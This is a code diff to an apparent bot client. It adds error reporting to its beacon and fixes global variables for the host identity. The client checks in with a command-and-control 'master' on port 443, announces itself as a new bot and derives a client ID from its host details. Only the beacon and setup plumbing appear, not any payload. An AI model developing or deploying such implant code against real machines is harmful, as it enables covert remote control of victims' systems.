@@ -19,7 +19,7 @@ from data_types import Exec_Token, Set_Token, Reply_Token, Command
 ## Information
 
 clientID = ""
-localhost = "127.0.0.1"
+localhost = ""
 master = "127.0.0.1"
 cert = "cert.pem"
 
@@ -143,12 +143,15 @@ def beacon (dst_addr, dst_port, init=False):
 	try:
 		cmds = []
 		info = []
+		err = []
 		if init:
 			cmds = [ Command(time.time(), time.time(), "NEW-BOT-INITIALIZED", "") ]
 			info = [0]
+		while not errQ.empty() and pythonErrors:
+			err.append(errQ.get(True))
 		while not sendQ.empty():
 			cmds.append(sendQ.get(True))
- 		sendObj = makeJSON( Reply_Token( clientID, localhost, cmds, info ) )
+ 		sendObj = makeJSON( Reply_Token( clientID, localhost, cmds, err, info ) )
 		response = send (master, 443, sendObj)
 		handler = Handler(response)
 		handler.start()
@@ -182,7 +185,8 @@ def generateCert():
 def init ():
 
 	try:
-		localhost = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
+		global localhost
+		localhost  = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
 		hasher = sha512()
 		hashed = hasher.update  (
 					  str(localhost).encode('utf-8') +\
@@ -190,6 +194,7 @@ def init ():
 					  str(random.randint(1,sys.maxsize)).encode('utf-8') +\
 					  str(sys.getrefcount(hasher)).encode('utf-8')
 					)
+		global clientID 
 		clientID = str(binascii.hexlify(hasher.digest())).encode('utf-8') 
 		if not os.path.isfile(cert):			
 			generateCert()	
@@ -214,6 +219,7 @@ def main ():
 
 	try:
 		init()
+		print("LOCALHOST: "+localhost)
 		beacon(master, 443, True)
 		while True:
 			time.sleep(sleepDuration)
